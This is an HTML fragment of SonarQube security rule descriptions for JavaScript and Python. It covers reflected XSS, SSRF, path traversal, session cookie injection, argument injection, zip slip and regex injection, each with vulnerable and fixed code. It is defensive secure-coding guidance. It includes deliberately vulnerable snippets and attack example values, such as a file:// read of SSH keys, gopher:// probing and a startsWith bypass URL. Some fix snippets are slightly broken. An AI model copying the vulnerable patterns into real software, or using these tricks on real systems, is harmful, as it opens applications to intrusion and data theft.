  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/95">CWE-95 - Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval
  Injection')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=jssecurity:S5131">
              jssecurity:S5131
            </a>
          </td>
          <td>
            <details>
              <p>This vulnerability makes it possible to temporarily execute JavaScript code in the context of the application, granting access to the session of
the victim. This is possible because user-provided data, such as URL parameters, are copied into the HTML body of the HTTP response that is sent back
to the user.</p>
<h2>Why is this an issue?</h2>
<p>Reflected cross-site scripting (XSS) occurs in a web application when the application retrieves data like parameters or headers from an incoming
HTTP request and inserts it into its HTTP response without first sanitizing it. The most common cause is the insertion of GET parameters.</p>
<p>When well-intentioned users open a link to a page that is vulnerable to reflected XSS, they are exposed to attacks that target their own
browser.</p>
<p>A user with malicious intent carefully crafts the link beforehand.</p>
<p>After creating this link, the attacker must use phishing techniques to ensure that his target users click on the link.</p>
<h3>What is the potential impact?</h3>
<p>A well-intentioned user opens a malicious link that injects data into the web application. This data can be text, but it can also be arbitrary code
that can be interpreted by the target user’s browser, such as HTML, CSS, or JavaScript.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Vandalism on the front-end website</h4>
<p>The malicious link defaces the target web application from the perspective of the user who is the victim. This may result in loss of integrity and
theft of the benevolent user’s data.</p>
<h4>Identity spoofing</h4>
<p>The forged link injects malicious code into the web application. The code enables identity spoofing thanks to cookie theft.</p>
<h4>Record user activity</h4>
<p>The forged link injects malicious code into the web application. To leak confidential information, attackers can inject code that records keyboard
activity (keylogger) and even requests access to other devices, such as the camera or microphone.</p>
<h4>Chaining XSS with other vulnerabilities</h4>
<p>In many cases, bug hunters and attackers chain cross-site scripting vulnerabilities with other vulnerabilities to maximize their impact.<br> For
example, an XSS can be used as the first step to exploit more dangerous vulnerabilities or features that require higher privileges, such as a code
injection vulnerability in the admin control panel of a web application.</p>
<h2>How to fix it in Express.js</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to cross-site scripting because it returns an HTML response that contains unsanitized user input.</p>
<p>If you do not intend to send HTML code to clients, the vulnerability can be fixed by specifying the type of data returned in the response. For
example, you can use the <code>JsonResponse</code> class to safely return JSON messages.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
function (req, res) {
    json = JSON.stringify({ "data": req.query.input });
    res.send(json);
};
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
function (req, res) {
    res.json({ "data": req.query.input });
};
</pre>
<p>It is also possible to set the content-type header manually using the <code>content_type</code> parameter when creating an
<code>HttpResponse</code> object.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="2" data-diff-type="noncompliant">
function (req, res) {
    res.send(req.query.input);
};
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="2" data-diff-type="compliant">
function (req, res) {
    res.set('Content-Type', 'text/plain');
    res.send(req.query.input);
};
</pre>
<h3>How does this work?</h3>
<p>In case the response consists of HTML code, it is highly recommended to use a template engine like <a href="https://ejs.co/">ejs</a> to generate
it. This template engine separates the view from the business logic and automatically encodes the output of variables, drastically reducing the risk
of cross-site scripting vulnerabilities.</p>
<p>If you do not intend to send HTML code to clients, the vulnerability can be resolved by telling them what data they are receiving with the
<code>content-type</code> HTTP header. This header tells the browser that the response does not contain HTML code and should not be parsed and
interpreted as HTML. Thus, the HTTP response is not vulnerable to reflected Cross-Site Scripting.</p>
<p>For example, setting the content-type header to <code>text/plain</code> allows to safely reflect user input since browsers will not try to parse
and execute the response.</p>
<h3>Pitfalls</h3>
<h4>Content-types</h4>
<p>Be aware that there are more content-types than <code>text/html</code> that allow to execute JavaScript code in a browser and thus are prone to
cross-site scripting vulnerabilities.<br> The following content-types are known to be affected:</p>
<ul>
  <li> application/mathml+xml </li>
  <li> application/rdf+xml </li>
  <li> application/vnd.wap.xhtml+xml </li>
  <li> application/xhtml+xml </li>
  <li> application/xml </li>
  <li> image/svg+xml </li>
  <li> multipart/x-mixed-replace </li>
  <li> text/html </li>
  <li> text/rdf </li>
  <li> text/xml </li>
  <li> text/xsl </li>
</ul>
<h4>The limits of validation</h4>
<p>Validation of user inputs is a good practice to protect against various injection attacks. But for XSS, validation on its own is not the
recommended approach.</p>
<p>As an example, filtering out user inputs based on a deny-list will never fully prevent XSS vulnerability from being exploited. This practice is
sometimes used by web application firewalls. It is only a matter of time for malicious users to find the exploitation payload that will defeat the
filters.</p>
<p>Another example is applications that allow users or third-party services to send HTML content to be used by the application. A common approach is
trying to parse HTML and strip sensitive HTML tags. Again, this deny-list approach is vulnerable by design: maintaining a list of sensitive HTML tags,
in the long run, is very difficult.</p>
<p>A preferred option is to use Markdown in conjunction with a parser that removes embedded HTML and restricts the use of "javascript:" URI.</p>
<h3>Going the extra mile</h3>
<h4>Content Security Policy (CSP) Header</h4>
<p>With a defense-in-depth security approach, the <strong>CSP</strong> response header can be added to instruct client browsers to
<strong>block</strong> loading data that does not meet the application’s security requirements. If configured correctly, this can prevent any attempt
to exploit XSS in the application.<br> <a href="https://web.dev/csp-xss/">Learn more here.</a></p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> <a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html">OWASP Cheat Sheet</a> - XSS
  Prevention Cheat Sheet </li>
  <li> <a href="https://expressjs.com/en/api.html">Express, 4.x API</a> </li>
</ul>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> <a href="https://blog.sonarsource.com/wordpress-stored-xss-vulnerability">SonarSource, WordPress 5.8.2 Stored XSS Vulnerability</a> </li>
  <li> <a href="https://blog.sonarsource.com/ghost-admin-takeover">SonarSource, Ghost CMS 4.3.2 - Cross-Origin Admin Takeover</a> </li>
  <li> <a href="https://samy.pl/myspace/">Samy Kamkar, The MySpace Worm</a> </li>
</ul>
<h3>Conference presentations</h3>
<ul>
  <li> <a href="https://www.youtube.com/watch?v=ksq7e6UUDag">DEF CON Safe Mode Red Team Village, Ray Doyle, Weaponized XSS Moving Beyond Alert</a>
  </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)">Top 10 2017 Category A7 - Cross-Site Scripting
  (XSS)</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/79">CWE-79 - Improper Neutralization of Input During Web Page Generation ('Cross-site
  Scripting')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=jssecurity:S5144">
              jssecurity:S5144
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Server-Side Request Forgery (SSRF) occurs when attackers can coerce a server to perform arbitrary requests on their behalf.<br></p>
<p>An SSRF vulnerability can either be basic or blind, depending on whether the server’s fetched data is directly returned in the web application’s
response.<br> The absence of the corresponding response for the coerced request on the application is not a barrier to exploitation and thus must be
treated in the same way as basic SSRF.</p>
<h3>What is the potential impact?</h3>
<p>SSRF usually results in unauthorized actions or data disclosure in the vulnerable application or on a different system it can reach. Conditional to
what is reachable, remote command execution can be achieved, although it often requires chaining with further exploitations.</p>
<p>Information disclosure is SSRF’s core outcome. Depending on the extracted data, an attacker can perform a variety of different actions that can
range from low to critical severity.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Local file read to host takeover</h4>
<p>An attacker manipulates an application into performing a local request for a sensitive file, such as <code>~/.ssh/id_rsa</code>, by using the File
URI scheme <code>file://</code>.<br> Once in possession of the SSH keys, the attacker establishes a remote connection to the system hosting the web
application.</p>
<h4>Internal Network Reconnaissance</h4>
<p>An attacker enumerates internal accessible ports from the affected server or others to which the server can communicate by iterating over the port
field in the URL <code>http://127.0.0.1:{port}</code>.<br> Taking advantage of other supported URL schemas (dependent on the affected system), for
example, <code>gopher://127.0.0.1:3306</code>, an attacker would be able to connect to a database service and perform queries on it.</p>
<h2>How to fix it in Node.js</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to SSRF as it opens a URL defined by untrusted data.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
const axios = require('axios');
const express = require('express');

const app = express();

app.get('/example', async (req, res) =&gt; {
    try {
        await axios.get(req.query.url); // Noncompliant
        res.send("OK");
    } catch (err) {
        console.error(err);
        res.send("ERROR");
    }
})
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
const axios = require('axios');
const express = require('express');

const schemesList = ["http:", "https:"];
const domainsList = ["trusted1.example.com", "trusted2.example.com"];

app.get('/example', async (req, res) =&gt; {
    const url = (new URL(req.query.url));

    if (schemesList.includes(url.protocol) &amp;&amp; domainsList.includes(url.hostname)) {
        try {
            await axios.get(url);
            res.send("OK");
        } catch (err) {
            console.error(err);
            res.send("ERROR");
        }
    }else {
        res.send("INVALID_URL");
    }
})
</pre>
<h3>How does this work?</h3>
<h4>Pre-Approved commands</h4>
<p>Create a list of authorized and secure URLs that you want the application to be able to request.<br> If a user input does not match an entry in
this list, it should be rejected because it is considered unsafe.</p>
<p><strong>Important note</strong>: The application must do validation on the server side. Not on client-side front-ends.</p>
<h3>Pitfalls</h3>
<h4>The trap of 'StartsWith' and equivalents</h4>
<p>When validating untrusted URLs by checking if they start with a trusted scheme and authority pair <code>scheme://authority</code>, <strong>ensure
that the validation string contains a path separator <code>/</code> as the last character</strong>.<br></p>
<p>If the validation string does not contain a terminating path separator, the SSRF vulnerability remains; only the exploitation technique
changes.</p>
<p>Thus, a validation like <code>startsWith("https://example.com")</code> or an equivalent with the regex <code>^https://example\.com.*</code> can be
exploited with the following URL <code>https://example.commit.malicious.io</code>.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A10_2021-Server-Side_Request_Forgery_%28SSRF%29/">Top 10 2021 Category A10 - Server-Side Request
  Forgery (SSRF)</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/918">CWE-918 - Server-Side Request Forgery (SSRF)</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=jssecurity:S2083">
              jssecurity:S2083
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Path injections occur when an application uses untrusted data to construct a file path and access this file without validating its path first.</p>
<p>A user with malicious intent would inject specially crafted values, such as <code>../</code>, to change the initial intended path. The resulting
path would resolve somewhere in the filesystem where the user should not normally have access to.</p>
<h3>What is the potential impact?</h3>
<p>A web application is vulnerable to path injection and an attacker is able to exploit it.</p>
<p>The files that can be affected are limited by the permission of the process that runs the application. Worst case scenario: the process runs with
root privileges on Linux, and therefore any file can be affected.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Override or delete arbitrary files</h4>
<p>The injected path component tampers with the location of a file the application is supposed to delete or write into. The vulnerability is exploited
to remove or corrupt files that are critical for the application or for the system to work properly.</p>
<p>It could result in data being lost or the application being unavailable.</p>
<h4>Read arbitrary files</h4>
<p>The injected path component tampers with the location of a file the application is supposed to read and output. The vulnerability is exploited to
leak the content of arbitrary files from the file system, including sensitive files like SSH private keys.</p>
<h2>How to fix it in Node.js</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to path injection as it creates a path using untrusted data without validation.</p>
<p>An attacker can exploit the vulnerability in this code to read arbitrary files.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="11" data-diff-type="noncompliant">
const path = require('path');
const fs   = require('fs');

function (req, res) {
  const targetDirectory = "/data/app/resources/";
  const userFilename = path.join(targetDirectory, req.query.filename);

  let data = fs.readFileSync(userFilename, { encoding: 'utf8', flag: 'r' }); // Noncompliant
}
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="11" data-diff-type="compliant">
const path = require('path');
const fs   = require('fs');

function (req, res) {
  const targetDirectory = "/data/app/resources/";
  const userFilename = path.join(targetDirectory, req.query.filename);
  const userFilename = fs.realPath(userFilename);

  if (!userFilename.startsWith(targetDirectory)) {
    res.status(401).send();
  }

  let data = fs.readFileSync(userFilename, { encoding: 'utf8', flag: 'r' });
}
</pre>
<h3>How does this work?</h3>
<h4>Canonical path validation</h4>
<p>If it is impossible to use secure-by-design APIs that do this automatically, the universal way to prevent path injection is to validate paths
constructed from untrusted data:</p>
<ol>
  <li> Ensure the target directory path ends with a forward slash to prevent partial path traversal, for example, <code>/base/dirmalicious</code>
  starts with <code>/base/dir</code> but does not start with <code>/base/dir/</code>. </li>
  <li> Resolve the canonical path of the file by using methods like <code>`fs.realPath`</code>. This will resolve relative path or path components
  like <code>../</code> and removes any ambiguity regarding the file’s location. </li>
  <li> Check that the canonical path is within the directory where the file should be located. </li>
</ol>
<p><strong>Important Note</strong>: The order of this process pattern is important. The code must follow this order exactly to be secure by
design:</p>
<ol>
  <li> <code>data = transform(user_input);</code> </li>
  <li> <code>data = normalize(data);</code> </li>
  <li> <code>data = sanitize(data);</code> </li>
  <li> <code>use(data);</code> </li>
</ol>
<p>As pointed out in <a href="https://www.youtube.com/watch?v=V-DdcKADnFk">this SonarSource talk</a>, failure to follow this exact order leads to
security vulnerabilities.</p>
<h3>Pitfalls</h3>
<h4>Partial Path Traversal</h4>
<p>When validating untrusted paths by checking if they start with a trusted folder name, <strong>ensure the validation string contains a path
separator as the last character</strong>.<br> A partial path traversal vulnerability can be unintentionally introduced into the application without a
path separator as the last character of the validation strings.</p>
<p>For example, the following code is vulnerable to partial path injection. Note that the string <code>targetDirectory</code> does not end with a path
separator:</p>
<pre>
const path = require('path');

function (req, res) {
  const targetDirectory = "/data/app/resources"
  const userFilename = path.join(targetDirectory, req.query.filename));
  const userFilename = fs.realPath(userFilename);

  if (!userFilename.startsWith(targetDirectory)) {
    res.status(401).send();
  }

  let data = fs.readFileSync(userFilename);
}
</pre>
<p>This check can be bypassed because <code>"/Users/Johnny".startsWith("/Users/John")</code> returns <code>true</code>. Thus, for validation,
<code>"/Users/John"</code> should actually be <code>"/Users/John/"</code>.</p>
<p><strong>Warning</strong>: Some functions remove the terminating path separator in their return value.<br> The validation code should be tested to
ensure that it cannot be impacted by this issue.</p>
<h4>Do not use path.resolve as a validator</h4>
<p>The <a href="https://nodejs.org/api/path.html#pathresolvepaths">official documentation</a> states that if any argument other than the first is an
absolute path, any previous argument is discarded.</p>
<p>This means that including untrusted data in any of the parameters and using the resulting string for file operations may lead to a path traversal
vulnerability.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/22">CWE-22 - Improper Limitation of a Pathname to a Restricted Directory ('Path
  Traversal')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=jssecurity:S6287">
              jssecurity:S6287
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Session Cookie Injection occurs when a web application assigns session cookies to users using untrusted data.</p>
<p>Session cookies are used by web applications to identify users. Thus, controlling these enable control over the identity of the users within the
application.</p>
<p>The injection might occur via a GET parameter, and the payload, for example, <code><a
href="https://example.com?cookie=injectedcookie">https://example.com?cookie=injectedcookie</a></code>, delivered using phishing techniques.</p>
<h3>What is the potential impact?</h3>
<p>A well-intentioned user opens a malicious link that injects a session cookie in their web browser. This forces the user into unknowingly browsing a
session that isn’t theirs.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Sensitive data disclosure</h4>
<p>A victim introduces sensitive data within the attacker’s application session that can later be retrieved by them. This can lead to a variety of
implications depending on what type of data is disclosed. Strictly confidential user data or organizational data leakage have different impacts.</p>
<h4>Vulnerability chaining</h4>
<p>An attacker not only manipulates a user into browsing an application using a session cookie of their control but also successfully detects and
exploits a self-XSS on the target application.<br> The victim browses the vulnerable page using the attacker’s session and is affected by the XSS,
which can then be used for a wide range of attacks including credential stealing using mirrored login pages.</p>
<h2>How to fix it in Express.js</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to Session Cookie Injection as it assigns a session cookie using untrusted data.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
import express from "express";
import cookieParser from "cookie-parser";

const app = express();
app.use(cookieParser());

app.get("/checkcookie", (req, res) =&gt; {
    if (req.cookies["connect.sid"] === undefined) {
        const cookie = req.query.cookie;
        res.cookie("connect.sid", cookie); // Noncompliant
    }

    return res.redirect("/welcome");
});
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
import express from "express";
import cookieParser from "cookie-parser";

const app = express();
app.use(cookieParser());

app.get("/checkcookie", (req, res) =&gt; {
    if (req.cookies["connect.sid"] === undefined) {
        return res.redirect("/getcookie");
    }

    return res.redirect("/welcome");
});
</pre>
<h3>How does this work?</h3>
<p>Untrusted data, such as GET or POST request content, should always be considered tainted. Therefore, an application should not blindly assign the
value of a session cookie to untrusted data.</p>
<p>Session cookies should be generated using the built-in APIs of secure libraries that include session management instead of developing homemade
tools.<br> Often, these existing solutions benefit from quality maintenance in terms of features, security, or hardening, and it is usually better to
use these solutions than to develop your own.</p>
<h2>Resources</h2>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/384">CWE-384 - Session Fixation</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=jssecurity:S6350">
              jssecurity:S6350
            </a>
          </td>
          <td>
            <details>
              <p>Constructing arguments of system commands from user input is security-sensitive. It has led in the past to the following vulnerabilities:</p>
<ul>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-9920">CVE-2016-9920</a> </li>
  <li> <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-29472">CVE-2021-29472</a> </li>
</ul>
<p>Arguments of system commands are processed by the executed program. The arguments are usually used to configure and influence the behavior of the
programs. Control over a single argument might be enough for an attacker to trigger dangerous features like executing arbitrary commands or writing
files into specific directories.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Malicious arguments can result in undesired behavior in the executed command. </li>
  <li> Passing user input to a system command is not necessary. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Avoid constructing system commands from user input when possible. </li>
  <li> Ensure that no risky arguments can be injected for the given program, e.g., type-cast the argument to an integer. </li>
  <li> Use a more secure interface to communicate with other programs, e.g., the standard input stream (stdin). </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>Arguments like <code>-delete</code> or <code>-exec</code> for the <code>find</code> command can alter the expected behavior and result in
vulnerabilities:</p>
<pre>
const { spawn } = require("child_process");
const input = req.query.input;
const proc = spawn("/usr/bin/find", [input]); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>Use an allow-list to restrict the arguments to trusted values:</p>
<pre>
const { spawn } = require("child_process");
const input = req.query.input;
if (allowed.includes(input)) {
  const proc = spawn("/usr/bin/find", [input]);
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/88">CWE-88 - Argument Injection or Modification</a> </li>
  <li> <a href="https://blog.sonarsource.com/php-supply-chain-attack-on-composer">CVE-2021-29472</a> - PHP Supply Chain Attack on Composer </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=jssecurity:S6096">
              jssecurity:S6096
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Zip slip is a special case of path injection. It occurs when an application uses the name of an archive entry to construct a file path and access
this file without validating its path first.</p>
<p>This rule will consider all archives untrusted, assuming they have been created outside the application file system.</p>
<p>A user with malicious intent would inject specially crafted values, such as <code>../</code>, in the archive entry name to change the initial
intended path. The resulting path would resolve somewhere in the filesystem where the user should not normally have access.</p>
<h3>What is the potential impact?</h3>
<p>A web application is vulnerable to Zip Slip and an attacker is able to exploit it by submitting an archive he controls.</p>
<p>The files that can be affected are limited by the permission of the process that runs the application. Worst case scenario: the process runs with
root privileges on Linux, and therefore any file can be affected.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Override arbitrary files</h4>
<p>The application opens the archive to copy its entries to the file system. The entries' names contain path traversal payloads for existing files in
the system, which are overwritten once the entries are copied. The vulnerability is exploited to corrupt files critical for the application or
operating system to work properly.</p>
<p>It could result in data being lost or the application being unavailable.</p>
<h2>How to fix it in Node.js</h2>
<h3>Code examples</h3>
<p>The following code is vulnerable to Zip Slip as it is constructing a path using an archive entry name. This path is then used to copy a file
without being validated first. Therefore, it can be leveraged by an attacker to overwrite arbitrary files.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
const AdmZip = require("adm-zip");
const upload = require('multer');

app.get('/example', upload.single('file'), (req, res) =&gt; {
    const zip = new AdmZip(req.file.buffer);
    const zipEntries = zip.getEntries();

    zipEntries.forEach(function (zipEntry) {
        var writer = fs.createWriteStream(zipEntry.entryName); // Noncompliant
        writer.write(zipEntry.getData().toString("utf8"));
    });
});
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
const AdmZip = require("adm-zip");
const upload = require('multer');

const unzipTargetDir = "/example/directory/";

app.get('/example', upload.single('file'), (req, res) =&gt; {
    const zip = new AdmZip(req.file.buffer);
    const zipEntries = zip.getEntries();

    zipEntries.forEach(function (zipEntry) {
        const canonicalPath = path.normalize(unzipTargetDir + zipEntry.entryName);
        if (canonicalPath.startsWith(unzipTargetDir)) {
            let writer = fs.createWriteStream(canonicalPath);
            writer.write(zipEntry.getData().toString("utf8"));
        }
    });
});
</pre>
<h3>How does this work?</h3>
<p>The universal way to prevent Zip Slip is to validate the paths constructed from untrusted archive entry names.</p>
<p>The validation should be done as follow:</p>
<ol>
  <li> Resolve the canonical path of the file by using methods like <code>path.join</code> or <code>path.normalize</code>. This will resolve relative
  path or path components like <code>../</code> and removes any ambiguity regarding the file’s location. </li>
  <li> Check that the canonical path is within the directory where the file should be located. </li>
  <li> Ensure the target directory path ends with a forward slash to prevent partial path traversal, for example, <strong>/base/dirmalicious</strong>
  starts with <strong>/base/dir</strong> but does not start with <strong>/base/dir/</strong>. </li>
</ol>
<h3>Pitfalls</h3>
<h4>Partial Path Traversal</h4>
<p>When validating untrusted paths by checking if they start with a trusted folder name, <strong>ensure the validation strings all contain a path
separator as the last character</strong>.<br> A partial path traversal vulnerability can be unintentionally introduced into the application without a
path separator as the last character of the validation strings.</p>
<p>For example, the following code is vulnerable to partial path injection. Note that the string variable <code>targetDirectory</code> does not end
with a path separator:</p>
<pre>
const AdmZip = require("adm-zip");

const targetDirectory = "/Users/John";

app.get('/example', (req, res) =&gt; {
    const canonicalPath = path.normalize(targetDirectory + req.query.filename)

    if (canonicalPath.startsWith(targetDirectory)) {
        const zip = new AdmZip(canonicalPath);
	    const zipEntries = zip.getEntries();

    	zipEntries.forEach(function (zipEntry) {
            var writer = fs.createWriteStream(zipEntry.entryName);
            writer.write(zipEntry.getData().toString("utf8"));
	    });
    }
});
</pre>
<p>This check can be bypassed because <code>"/Users/Johnny".startsWith("/Users/John")</code> returns <code>true</code>. Thus, for validation,
<code>"/Users/John"</code> should actually be <code>"/Users/John/"</code>.</p>
<p><strong>Warning</strong>: Some functions remove the terminating path separator in their return value.<br> The validation code should be tested to
ensure that it cannot be impacted by this issue.</p>
<p><a href="https://github.com/advisories/GHSA-xwg4-93c6-3h42">Here is a real-life example of this vulnerability.</a></p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> <a href="https://snyk.io/research/zip-slip-vulnerability">snyk</a> - Zip Slip Vulnerability </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/Top10/A03_2021-Injection/">Top 10 2021 Category A3 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control">Top 10 2017 Category A5 - Broken Access Control</a>
  </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/20">CWE-20 - Improper Input Validation</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/22">CWE-22 - Improper Limitation of a Pathname to a Restricted Directory ('Path
  Traversal')</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=pythonsecurity:S2631">
              pythonsecurity:S2631
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Regular expression injections occur when the application retrieves untrusted data and uses it as a regex to pattern match a string with it.</p>
<p>Most regular expression search engines use <em>backtracking</em> to try all possible regex execution paths when evaluating an input. Sometimes this
can lead to performance problems also referred to as <em>catastrophic backtracking</em> situations.</p>
<h3>What is the potential impact?</h3>
<p>In the context of a web application vulnerable to regex injection:<br> After discovering the injection point, attackers insert data into the
vulnerable field to make the affected component inaccessible.</p>
<p>Depending on the application’s software architecture and the injection point’s location, the impact may or may not be visible.</p>
<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>
<h4>Self Denial of Service</h4>
<p>In cases where the complexity of the regular expression is exponential to the input size, a small, carefully-crafted input (for example, 20 chars)
can trigger <em>catastrophic backtracking</em> and cause a denial of service of the application.</p>
<p>Super-linear regex complexity can produce the same effects for a large, carefully crafted input (thousands of chars).</p>
<p>If the component jeopardized by this vulnerability is not a bottleneck that acts as a single point of failure (SPOF) within the application, the
denial of service might only affect the attacker who initiated it.</p>
<p>Such benign denial of service can also occur in architectures that rely heavily on containers and container orchestrators. Replication systems
would detect the failure of a container and automatically replace it.</p>
<h4>Infrastructure SPOFs</h4>
<p>However, a denial of service attack can be critical to the enterprise if it targets a SPOF component. Sometimes the SPOF is a software architecture
vulnerability (such as a single component on which multiple critical components depend) or an operational vulnerability (for example, insufficient
container creation capabilities or failures from containers to terminate).</p>
<p>In either case, attackers aim to exploit the infrastructure weakness by sending as many malicious payloads as possible, using potentially huge
offensive infrastructures.</p>
<p>These threats are particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h2>How to fix it in Python Standard Library</h2>
<h3>Code examples</h3>
<p>The following noncompliant code is vulnerable to Regex Denial of Service (ReDoS) because untrusted data is used as a regex to scan a string without
prior sanitization or validation.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
from flask import request
import re

@app.route('/lookup')
def lookup():
  regex = request.args['regex']
  data = request.args['data']

  re.search(regex, data) # Noncompliant
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
from flask import request
import re

@app.route('/lookup')
def lookup():
  regex = request.args['regex']
  data = request.args['data']

  re.search(re.escape(regex), data)
</pre>
<h3>How does this work?</h3>
<h4>Sanitization and Validation</h4>
<p>Metacharacters escape using native functions is a solution against regex injection.<br> The escape function sanitizes the input so that the regular
expression engine interprets these characters literally.</p>
<p>An allowlist approach can also be used by creating a list containing authorized and secure strings you want the application to use in a query.<br>
If a user input does not match an entry in this list, it should be considered unsafe and rejected.</p>
